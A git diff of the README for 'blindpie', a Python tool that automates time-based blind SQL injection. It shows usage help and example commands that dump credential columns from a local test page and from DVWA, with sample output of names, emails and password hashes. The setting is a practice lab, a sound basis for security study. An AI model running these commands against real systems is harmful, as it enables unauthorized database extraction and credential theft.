@@ -1,206 +1,172 @@
-# blindpie
+<h1 align="center">
+	<br>blindpie<br>
+</h1>
 
-`blindpie` is a simple Python script to automate time-based blind SQL injections.<br>
+<h4 align="center">Automatically exploit blind-SQLi vulnerabilities</h4>
 
-It can be used when the target doesn't print any error or any feedback whatsoever.
+<p align="center">
+	<a href="https://github.com/alessiovierti/blindpie/releases">
+		<img src="https://img.shields.io/github/release/alessiovierti/blindpie.svg">
+	</a>
+	<a href="https://travis-ci.com/alessiovierti/blindpie">
+		<img src="https://img.shields.io/travis/com/alessiovierti/blindpie.svg">
+	</a>
+</p>
 
-It should work fine injecting in SELECT, DELETE, and UPDATE queries. Injections in INSERT queries are supported only for parameters which are unquoted (numeric values).
+<p align="center">
+	[Installation](#installation) •
+	[Features](#features) •
+	[Usage](#usage) •
+	[Examples](#examples) •
+	[Tips](#tips) •
+	[Contributing](#contributing)
+</p>
 
-![Demo](/demo/demo.gif)
+<div align="center">![Demo Long Fetch](https://i.imgur.com/tfMaLG9.gif)</div>
 
-## Usage
-
-Use the `--help` command to show the help message:
+### Installation
 
 ```
-  _     _ _           _       _
- | |   | (_)         | |     (_)
- | |__ | |_ _ __   __| |_ __  _  ___
- | '_ \| | | '_ \ / _` | '_ \| |/ _ \
- | |_) | | | | | | (_| | |_) | |  __/
- |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
-                       | |
-                       |_|
+pip install blindpie
+```
 
-usage: blindpie.py [-h] -u URL -p PARAMS [PARAMS ...] -d DEFAULT [DEFAULT ...]
-                   (--post | --get) [-M M] [-T T]
-                   {test,attack} ...
+### Features
 
-A simple tool to automate time-based blind SQL injections.
+- Test if any parameter is exploitable
+- **Fast** multithreading fetching of a table
+- Dump part of a table or keep fetching until stopped / until end of table
+- Dump results on a TSV file
+- Use custom headers for HTTP requests
+- Define the default values of the other parameters in the requests
 
-positional arguments:
-  {test,attack}
+### Usage
+
+<h4 align="center">Testing parameters</h4><p></p>
+
+<div align="center">![Demo Test](https://i.imgur.com/0D9Zyx0.gif)</div>
+
+```
+usage: blindpie.py test [-h] -M method -P params [-H headers] [-T threshold]
+                        [-I max_interval]
 
 optional arguments:
   -h, --help            show this help message and exit
-  -u URL, --url URL     url of the target
-  -p PARAMS [PARAMS ...], --params PARAMS [PARAMS ...]
-                        parameters for the requests
-  -d DEFAULT [DEFAULT ...], --default DEFAULT [DEFAULT ...]
-                        default values for the parameters
-  --post                use method POST
-  --get                 use method GET
-  -M M                  attack mode (from 0, the least reliable but the
-                        fastest, to 4, the most reliable but the slowest)
-  -T T                  number of threads to create when getting multiple rows
-
-Note: the default values must be of the same type of data of the parameters
-(use numbers for the parameters which are numbers, strings otherwise).
+  -M method, --method method
+                        the HTTP method for the requests
+  -P params, --params params
+                        the parameters to test and their default values (must
+                        be a JSON dictionary)
+  -H headers, --headers headers
+                        the headers for the requests (must be a JSON
+                        dictionary)
+  -T threshold, --threshold threshold
+                        threshold used to decide if an answer is affirmative
+                        or negative (must be greater than 1)
+  -I max_interval, --max_interval max_interval
+                        max time to wait between each request in ms
 ```
 
-The script provides two modes of operation: the <i>test mode</i> and the <i>attack mode</i>.
+<h4 align="center">Fetching a table</h4><p></p>
 
-### Test mode
-
-The <i>test mode</i> is used to test which parameters of the GET/POST request could be vulnerable to SQL injection.
-
-This is the help message for the <i>test mode</i>:
+<div align="center">![Demo Short Fetch](https://i.imgur.com/ubsFh8M.gif)</div>
 
 ```
-usage: blindpie.py test [-h] --test
-
-optional arguments:
-  -h, --help  show this help message and exit
-  --test      test for vulnerabilities
-```
-
-Use the `--test` flag to test the parameters.
-
-#### Example:
-
-The page with url `192.168.0.104/sqli/time_based_blind_escaped.php` accepts POST requests with parameters `to` and `msg`, where the former is an integer and the latter is a string. The `-d` parameter is used to set the default value for the parameter of the request and to distinguish between numeric values (which in queries are unquoted) and strings (in queries are quoted). Use as default values strings if the parameter is a string, numeric values if the parameter is an integer, float, etc...
-
-```
-$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post test --test
-  _     _ _           _       _      
- | |   | (_)         | |     (_)     
- | |__ | |_ _ __   __| |_ __  _  ___
- | '_ \| | | '_ \ / _` | '_ \| |/ _ \
- | |_) | | | | | | (_| | |_) | |  __/
- |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
-                       | |           
-                       |_|           
-
-[*] avg response time is 0.019 sec (done in 0.049 sec)
-[*] testing params: |████████████████████████████████████████| 100.0% complete
-> RESULTS:
-[*] to seems to be vulnerable
-[*] msg doesn't seem to be vulnerable
-[*] all done in 0.063 sec
-```
-
-The script tests each parameter of the request and shows if it seems to be vulnerable or not.
-
-### Attack mode
-
-The <i>attack mode</i> is used to extract data from the database by exploiting vulnerable parameters.
-
-This is the help message for the <i>attack mode</i>:
-
-```
-usage: blindpie.py attack [-h] --param PARAM --table TABLE --column COLUMN
-                          --row ROW [--rows ROWS] [--max_length MAX_LENGTH]
-                          [--min_length MIN_LENGTH]
+usage: blindpie.py fetch_table [-h] -M method -P params [-H headers]
+                               [-T threshold] [-I max_interval] -p
+                               vulnerable_param -t table -c columns
+                               [-r from_row] [-n n_rows]
+                               [--min_row_length min_row_length]
+                               [--max_row_length max_row_length]
+                               [-o output_path]
 
 optional arguments:
   -h, --help            show this help message and exit
-  --param PARAM         vulnerable parameter to exploit
-  --table TABLE         name of the table from which to select
-  --column COLUMN       name of the column to select
-  --row ROW             index of the row to select
-  --rows ROWS           number of rows to select
-  --max_length MAX_LENGTH
-                        max length of a selected row
-  --min_length MIN_LENGTH
-                        min length of a selected row
+  -M method, --method method
+                        the HTTP method for the requests
+  -P params, --params params
+                        the parameters and their default values (must be a
+                        JSON dictionary)
+  -H headers, --headers headers
+                        the headers for the request (must be a JSON
+                        dictionary)
+  -T threshold, --threshold threshold
+                        threshold used to decide if an answer is affirmative
+                        or negative (must be greater than 1)
+  -I max_interval, --max_interval max_interval
+                        max time to wait between each request in ms
+  -p vulnerable_param, --vulnerable_param vulnerable_param
+                        the vulnerable parameter to exploit
+  -t table, --table table
+                        the name of the table to fetch
+  -c columns, --columns columns
+                        the columns to select
+  -r from_row, --from_row from_row
+                        the row from which to start to select
+  -n n_rows, --n_rows n_rows
+                        the number of rows to select
+  --min_row_length min_row_length
+                        limit selection to rows with this min length
+  --max_row_length max_row_length
+                        limit selection to rows with this max length
+  -o output_path, --output_path output_path
+                        path to the output file
 ```
 
-#### Example:
+### Examples
 
-The page with url `192.168.0.104/sqli/time_based_blind.php` accepts GET requests with a parameter named `email`, which is a string. The `-d` parameter is used to set the default value for the parameter. As said before, use as default values strings if the parameter is a string, numeric values if the parameter is an integer, float, etc...
+Let's consider for example the [Damn Vulnerable Web Application](http://www.dvwa.co.uk), in particular its page `vulnerabilities/sqli_blind/`.
 
-In this case I'm going to extract the rows from 0 to 3 of the `first_name` column from the table `accounts` by exploiting the `email` parameter of the GET request:
+The page shows a form to search information about a user. The form sends a GET request with parameters `id` and `Submit`.
 
-```
-$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T4 attack --table accounts --column first_name --param email --row 0 --rows 4
-  _     _ _           _       _      
- | |   | (_)         | |     (_)     
- | |__ | |_ _ __   __| |_ __  _  ___
- | '_ \| | | '_ \ / _` | '_ \| |/ _ \
- | |_) | | | | | | (_| | |_) | |  __/
- |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
-                       | |           
-                       |_|           
+To test which parameters are exploitable we can use the `test` command:
 
-[*] avg response time is 0.031 sec (done in 0.096 sec)
-[*] row 0 length is 6
-[*] row 1 length is 4
-[*] row 2 length is 6
-[*] row 3 length is 6
-[*] getting 4 rows: |████████████████████████████████████████| 100.0% complete (34.583 sec)
-> RESULTS:
-Arthur
-Ford
-Tricia
-Zaphod
-[*] all done in 34.583 sec
-```
+- First, we need to prepare a default request which contains the default values for the parameters, as a JSON dictionary:
 
-Note #1: use the `-M` parameter to set the reliability of the script. The value goes from 0 (the least reliable but the fastest) to 4 (the most reliable but the slowest).
+	`{"id":"1","Submit":"Submit"}`
 
-Note #2: use the `-T` parameter to set the number of rows to extract concurrently. <strong>Multithreading is suggested during local analysis only. It seems to be less reliable for non local targets.</strong>
+- Then we need to prepare the headers (if you don't provide any `blindpie` will use some default ones). In this case the page requires a PHPSESSID value in the Cookie header (and a cookie `security` to set the security level of DVWA):
 
-The script will test each character of each row and will print the rows found.
+	`{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}`
 
-### Trick
-
-You can extract multiple columns at once by concatenating the values. Use the `concat` function when specifying the column name:
+The following command will find which parameters are exploitable:
 
 ```
-$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param email --row 0 --rows 10
-  _     _ _           _       _
- | |   | (_)         | |     (_)
- | |__ | |_ _ __   __| |_ __  _  ___
- | '_ \| | | '_ \ / _` | '_ \| |/ _ \
- | |_) | | | | | | (_| | |_) | |  __/
- |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
-                       | |
-                       |_|
-
-[*] avg response time is 0.018 sec (done in 0.054 sec)
-[*] row 0 length is 71
-[*] row 1 length is 70
-[*] row 2 length is 75
-[*] row 3 length is 77
-[*] row 4 seems to be empty
-[*] row 5 seems to be empty
-[*] row 6 seems to be empty
-[*] row 7 seems to be empty
-[*] row 8 seems to be empty
-[*] row 9 seems to be empty
-[*] getting 10 rows: |████████████████████████████████████████| 100.0% complete (373.877 sec)
-> RESULTS:
-1 Arthur Dent arthur@guide.com d00ee262cdcbe7543210bb85f6f1cac257b4e994
-2 Ford Prefect ford@guide.com 30f5cc99c17426a0d28acf8905c6d776039ad022
-3 Tricia McMillan tricia@guide.com bcb3358e273b5772ee0ae1799b612e13cc726b04
-4 Zaphod Beeblebrox zaphod@guide.com 0c38530eaca4dbc0f49c459c0c52b362f14215c3
-[empty]
-[empty]
-[empty]
-[empty]
-[empty]
-[empty]
-[*] all done in 373.877 sec
+$ blindpie.py -u {YOUR_DVWA_INSTANCE}/vulnerabilities/sqli_blind/ test -M get -P '{"id":"1","Submit":"Submit"}' -H '{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}'
 ```
 
-Note #1: a row can't be longer than `MAX_ROW_LENGTH` (by default is 128) or it will be ignored and considered empty.
+`blindpie` will find out that the `id` parameter is indeed exploitable.
 
-Note #2: `char(32)` is the 'space' character.
+Let's say, for example, that we want to dump the `user` table, by selecting its columns `user` and `password` by exploiting the vulnerability we found.
 
-## Authors
+The following command will dump the fetched rows into a TSV file:
+
+```
+$ blindpie.py -u {YOUR_DVWA_INSTANCE}/vulnerabilities/sqli_blind/ fetch_table -M get -P '{"id":"1","Submit":"Submit"}' -H '{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}' -p "id" -t "users" -c "user,password"
+```
+
+If you want to end the fetching before it may be completed, stop it with <kbd>CTRL</kbd>+<kbd>C</kbd>.
+You'll find the dumped table in a file named `blindpie.out` in your working directory.
+
+### Tips
+
+`blindpie` gives you some ways of getting faster or more reliable results:
+
+- `--threshold` can make fetching much faster when it's close to 1 but it will be also much less reliable.
+- `--max_interval` can make requests more distant one with the other. Choose wisely since an high value will make fetching much slower. When testing local targets you should use 0.
+- `--min_row_length` and `--max_row_length` can help get faster results by limiting the search to rows with length in this range.
+
+### Contributing
+
+If you have any idea, tip, or you want to contribute in any way, open an issue or contact me in any way you prefer.
+
+If you want to have a look at how the project is structured check `./docs/uml/uml.svg`.
+
+If you wanna play with it or extend it use the `Makefile` to install the requirements (`$ make init`) or launch the tests (`$ make test`).
+
+### Authors
 
 * **Alessio Vierti** - *Initial work*
 
-## License
+### License
 
 This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
